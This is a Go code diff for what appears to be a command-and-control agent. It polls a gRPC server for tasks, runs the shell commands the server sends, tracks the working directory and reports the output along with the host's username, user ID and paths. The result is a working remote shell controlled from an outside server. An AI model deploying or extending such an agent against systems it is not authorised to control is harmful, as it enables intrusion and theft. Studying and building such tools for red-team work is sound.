@@ -2,10 +2,12 @@ package main
 
 import (
 	"context"
+	"errors"
 	"fmt"
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"os/user"
 	"time"
 
@@ -28,7 +30,11 @@ type AgentInfo struct {
 	Username string
 	UserId   string
 	Hostname string
+	Cwd      string
+	HomeDir  string
 }
+
+var info *AgentInfo
 
 func loadUUID() (string, error) {
 	file, err := os.OpenFile(UUID_FILE, os.O_RDONLY, 0644)
@@ -67,8 +73,13 @@ func updateUUID(uuid string) {
 	os.WriteFile(UUID_FILE, []byte(uuid), 0644)
 }
 
-func gRPCConnect() {
-
+func UpdateCwd() error {
+	dir, err := os.Getwd()
+	if err != nil {
+		return err
+	}
+	info.Cwd = dir
+	return nil
 }
 
 func Connect(conn *grpc.ClientConn, services *Services) *AgentInfo {
@@ -77,6 +88,8 @@ func Connect(conn *grpc.ClientConn, services *Services) *AgentInfo {
 	username := user.Username
 	userId := user.Uid
 	hostname, _ := os.Hostname()
+	homeDir, _ := os.UserHomeDir()
+	cwd, _ := os.Getwd()
 
 	fmt.Println(uuid, username, userId)
 	fmt.Println("Hostname:", hostname)
@@ -85,6 +98,7 @@ func Connect(conn *grpc.ClientConn, services *Services) *AgentInfo {
 		Hostname: hostname,
 		Username: username,
 		UserId:   userId,
+		Cwd:      cwd,
 	}
 
 	if len(uuid) != 0 {
@@ -113,6 +127,8 @@ func Connect(conn *grpc.ClientConn, services *Services) *AgentInfo {
 		Username: username,
 		UserId:   userId,
 		Hostname: hostname,
+		HomeDir:  homeDir,
+		Cwd:      cwd,
 	}
 }
 
@@ -125,7 +141,7 @@ func InitServices(conn *grpc.ClientConn) *Services {
 	}
 }
 
-func FetchTasks(services *Services, info *AgentInfo) ([]*pb.Task, uint32, error) {
+func FetchTasks(services *Services) ([]*pb.Task, uint32, error) {
 	fmt.Println("Fetching tasks")
 	request := &pb.GetAgentUnexecutedTasksRequest{
 		AgentId: info.Uuid,
@@ -140,10 +156,85 @@ func FetchTasks(services *Services, info *AgentInfo) ([]*pb.Task, uint32, error)
 	return resp.GetTasks(), resp.GetSleepTime(), nil
 }
 
+func ExecuteShell(task *pb.Task) ([]byte, error) {
+	parts := task.GetArgs()
+	if parts == nil || len(parts) == 0 {
+		return nil, errors.New("No arguments provided")
+	}
+	cmd := parts[0]
+	args := parts[1:]
+	if cmd == "cd" {
+		var dir string
+
+		if len(args) == 0 {
+			dir = info.HomeDir
+		} else {
+			dir = args[0]
+		}
+
+		err := os.Chdir(dir)
+		if err != nil {
+			return nil, err
+		}
+
+		err = UpdateCwd()
+		if err != nil {
+			return nil, err
+		}
+		fmt.Println(info.Cwd)
+		return nil, nil
+	}
+
+	command := exec.Command(cmd, args...)
+	command.Dir = info.Cwd
+	out, err := command.Output()
+	if err != nil {
+		return nil, err
+	}
+
+	fmt.Println(string(out))
+	return out, nil
+}
+
 func ExecuteTask(task *pb.Task) (*pb.TaskResult, error) {
 	// Handle execution & stuff
 	fmt.Println("Executing task", task.Name)
-	return &pb.TaskResult{TaskId: task.TaskId}, nil
+	switch task.Type {
+	case pb.TaskType_SHELL:
+		{
+			var (
+				status int32 = 200
+				output string
+			)
+
+			out, err := ExecuteShell(task)
+			output = string(out)
+			if err != nil {
+				log.Fatal(err)
+				status = 500
+				output = err.Error()
+			}
+
+			return &pb.TaskResult{
+				TaskId: task.TaskId,
+				Output: output,
+				Status: status,
+			}, nil
+		}
+	case pb.TaskType_PING:
+		{
+			return &pb.TaskResult{
+				TaskId: task.TaskId,
+				Output: "pong",
+				Status: 200,
+			}, nil
+		}
+	}
+	return &pb.TaskResult{
+		TaskId: task.TaskId,
+		Output: "Unknown",
+		Status: 404,
+	}, nil
 }
 
 func SendResult(services *Services, result *pb.TaskResult) error {
@@ -151,6 +242,12 @@ func SendResult(services *Services, result *pb.TaskResult) error {
 
 	request := &pb.CreateTaskResultRequest{
 		TaskResult: result,
+		Info: &pb.Agent{
+			Id:       info.Uuid,
+			Cwd:      info.Cwd,
+			Username: info.Username,
+			UserId:   info.UserId,
+		},
 	}
 
 	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
@@ -169,10 +266,10 @@ func main() {
 
 	services := InitServices(conn)
 
-	info := Connect(conn, services)
+	info = Connect(conn, services)
 
 	for {
-		tasks, sleep, err := FetchTasks(services, info)
+		tasks, sleep, err := FetchTasks(services)
 		if err != nil {
 			log.Panic("Unable to fetch tasks")
 		}
